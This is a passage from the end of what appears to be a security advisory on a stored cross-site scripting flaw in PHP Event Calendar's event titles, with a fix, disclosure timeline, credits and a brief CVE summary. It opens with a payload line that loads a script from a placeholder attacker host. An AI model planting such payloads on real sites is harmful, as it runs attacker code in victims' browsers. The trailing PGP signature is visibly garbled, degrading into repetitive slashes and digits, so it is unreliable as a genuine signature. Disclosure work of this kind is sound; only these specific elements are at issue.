```
<script src="http://<attacking-machine>/XSS.js"/>
",
"description":"",
[...snip...]
}
~~~
As soon as the victim's browser renders this response, the malicious
script "XSS.js" is loaded and executed.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
To prevent cross-site scripting attacks, all user-provided input should be
validated, and control characters should be masked in a context-sensitive
manner.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2021-07-29: Vulnerability discovered
2021-08-09: Vulnerability reported to manufacturer
2021-11-04: Public disclosure of vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product Website for PHP Event Calendar
<https://phpeventcalendar.com/>
[2] Documentation Website for PHP Event Calendar
<https://phpeventcalendar.com/documentation/>
[3] SySS Security Advisory SYSS-2021-049
<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-049.txt>
[4] SySS Responsible Disclosure Policy
<https://www.syss.de/en/news/responsible-disclosure-policy/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Erik Steltzner and
Maurizio Ruchay of SySS GmbH.
E-Mail: erik.steltzner () syss de
Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Erik_Steltzner.asc>
Key ID: 0x4C7979CE53163268
Key Fingerprint: 6538 8216 555B FBE7 1E01 7FBD 4C79 79CE 5316 3268
E-Mail: maurizio.ruchay () syss de
Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Maurizio_Ruchay.asc>
Key ID: 0xC7D20E267F0FA978
Key Fingerprint: D506 AB5A FE3E 09AE FFBE DEB2 C7D2 0E26 7F0F A978
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: <http://creativecommons.org/licenses/by/3.0/deed.en>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIzBAEBCgAdFiEE119/0s+Lp4e/j3/p8dIOJnv7nSYFAmGb/iEACgkQ8dIOJnv7
nSb3cg//X5l8y+X3Z9d5Y70fQ8a4Q1a142aQ6NqgZ21QpU5R9dK6Jj/4h7X0cQ
1Q8pXy0iZ63pQc8f6wG87gLw2l6xJ177j89N/wJk10l7m/nFkO2h51U6+7v2jW
dJq3F/oR5809zS/Y88j3iM04+g9f/p7Uj26+uV8i8Q0y5q2jK7v5i7V4/L/86e
p816y6qFm80/vj1T+5X/95J6g11j/4G0k06/19qZ15h/i/9z5o4U3w6p6/05u
/7+l4uV/805x19n/p7G63T1b9q28o4U7g5Z/6y1e10/93q+8p7/911p6y+i6i
/8z36y4U5/1b9f/76f2k/38p7i/8z17v6/1d07u8/5y/7b9/8/07x1/9/6/2l
+4k8l3/5f9f+76/9/17z9h/4369x1/81f+5q/48p7/7v/50n9/97f9/7/6/6j
k/9p86i/8+u+7r/7f/80p7/7n7/9f+61/0/9z/1/96436y/9/679i/6h79/7f
278/87u/6t/7l9v7+h/9196/6h9m33/8q4X/9f/83z9v6b/38g/609/7p/841
sQj+8/8+u+96f+61n//8/73//79f8/95i/9//99///8+p///9+f+9//9//2g
t/9h1/57/78/4/9v/+f797//6//8//+f/9////4////7//3/1/9////8///0
g/8f///8+P+8f//4/+///2+4/5///9////2/9/8/9////9/5//4//7/9/9f
w6Y/1f///8/////7/////9////8v/9////+///8//+///z/////8//4//9/
+f///+///8//9/+///8//8//6///////8//8=
=e/uK
-----END PGP SIGNATURE-----
```
### Summary of CVE-2021-42078

- **Root cause of vulnerability**: The application fails to sanitize the title of calendar events allowing the injection of JavaScript code.
- **Weaknesses/vulnerabilities present**: Persistent Cross-site Scripting (XSS).
- **Impact of exploitation**:  An attacker can inject malicious JavaScript code into the title of a calendar event. When another user views the event details, the malicious script executes in their browser, potentially allowing the attacker to perform actions on the page in the context of the victim user.
- **Attack vectors**: An attacker can submit a crafted POST request to the `/server/ajax/events_manager.php` endpoint containing a malicious JavaScript payload within the `title` parameter when creating a calendar event.
- **Required attacker capabilities/position**: The attacker needs the ability to create calendar events in the application to exploit the vulnerability.